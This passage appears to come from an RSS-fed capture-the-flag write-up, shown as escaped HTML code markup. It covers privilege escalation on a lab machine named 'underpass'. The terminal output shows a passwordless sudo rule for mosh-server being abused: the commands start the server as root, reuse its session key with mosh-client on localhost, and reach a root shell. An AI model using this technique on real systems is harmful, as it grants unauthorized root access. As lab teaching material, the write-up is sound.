&lt;span class="nx">use_pty&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">svcMosh&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">ALL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">mosh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">mosh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">MOSH&lt;/span> &lt;span class="nx">CONNECT&lt;/span> &lt;span class="mi">60002&lt;/span> &lt;span class="nx">zl0g6Tbx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">KIgOR0jzdQ9wA&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">svcMosh&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">MOSH_KEY&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">zl0g6Tbx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">KIgOR0jzdQ9wA&lt;/span> &lt;span class="nx">mosh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">client&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span> &lt;span class="mi">60002&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">pwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">underpass&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p></description></item></channel></rss>
